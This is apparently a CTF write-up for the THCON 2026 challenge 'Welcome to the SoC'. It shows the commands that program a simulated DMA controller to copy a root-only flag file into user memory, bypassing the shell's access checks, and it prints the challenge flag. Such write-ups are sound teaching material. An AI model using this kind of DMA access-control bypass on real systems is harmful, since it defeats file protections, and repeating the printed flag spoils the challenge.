---
layout: post
title:  "Welcome to the SoC"
date:   2026-05-12 19:34:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /THCON-CTF-2026-welcome-to-the-soc/
---

**Category**: Misc

**Author**: [Thomas Chourret](https://thomaschourret.fr/)

**Description**: Don't worry agent, no blue team knowledge needed for this ! We need help investigating a SoC found in the remains of a factory in the southern quadrant that the C.O.P.S. were able to compromise.

Some important information are stored in the root directory, our goal it to extract them.

Connect to the OS with socat STDIO,raw,echo=0 TCP:51.11.228.103:1337

`nc 51.11.228.103 1337`

I get a challenge file called `user_guide.pdf`. These are the most useful sections:
```shell
... etc

SoC-2000 User Guide — UG-2000
Address Range Zone Description
0x0000--0x0FFF System Kernel data and system files.
0x1000--0x3FFF User Space User-created file storage. Dynamically allocated.
0x4000--0x403F DMA DMA controller MMIO registers (64 bytes).
0x4100--0x411F GPIO GPIO controller registers (32 bytes).
0x4200--0x421F UART UART controller registers (32 bytes).
0x4300--0x431F Timer Timer controller registers (32 bytes).
0x4320--0xFFFF Unmapped Reserved.
Table 2: SoC-2000 Memory Map

... etc

7 SoC-OS Shell Reference
SoC-OS provides an interactive shell. The following commands are available:
Command Description
ls [path] List directory contents. Displays permissions, size, RAM ad-
dress, and filename.
cat <file> Print file contents. Respects file permissions.
touch <file> Create a new file under /home/user/. Allocates 64 bytes in user
space.
cd [path] Change working directory.
pwd Print current working directory.
write_mem <addr> <val> Write a 32-bit hexadecimal value to a memory address.
hexdump <addr> <len> Display a hex dump of memory (max 256 bytes).
lscpu Display processor and SoC information.
help Show available commands.
exit Disconnect from the system.
Table 9: Shell Commands
```

Connecting to the challenge server:
```shell
socat STDIO,raw,echo=0 TCP:51.11.228.103:1337  
  
 ____         ____       ___  ____  
/ ___|  ___  / ___| ___ / _ \/ ___|  
\___ \ / _ \| |    ___|| | | \___ \  
   ___) | (_) | |___|___|| |_|___) |  
|____/ \___/ \____|     \___/|____/  
  
SoC-OS v1.0  
  
user@socos:~$ ls  
-rw-r--r--  128B  [0x00000100]  .profile  
user@socos:~$ cat .profile  
# SoC-OS user profile  
# Type 'help' for available commands  
  
user@socos:~$ ls /  
drwxr-xr-x    -             root/  
drwxr-xr-x    -             home/  
drwxr-xr-x    -             dev/  
user@socos:~$ ls /root  
-r--------   64B  [0x00000200]  flag.txt
```

The shell blocks direct `hexdump` or `cat` of the system zone (`0x0000-0x0FFF`) where `/root/flag.txt` is (`0x00000200`).

The DMA controller is a hardware module that moves data directly on the memory bus. By programming its registers (base `0x4000`):
- source address = `0x200` (the flag location)
- destination address = `0x1000` (a writable user zone address)
- bytes to transfer = `0x40` (64 bytes, triggers the copy)

```shell
user@socos:~$ write_mem 0x4018 0x200  
user@socos:~$ write_mem 0x4020 0x1000  
user@socos:~$ write_mem 0x4028 0x40  
user@socos:~$ hexdump 0x1000 64  
0x00001000: 54 48 43 7B 44 4D 41 2D 31 73 5F 6E 30 74 5F 35  |THC{DMA-1s_n0t_5|  
0x00001010: 74 72 30 6E 67 5F 65 6E 30 75 67 68 3F 7D 00 00  |tr0ng_en0ugh?}..|  
0x00001020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|  
0x00001030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
```

The DMA copies the flag data into user space. Once there `hexdump` can read it.

`THC{DMA-1s_n0t_5tr0ng_en0ugh?}`
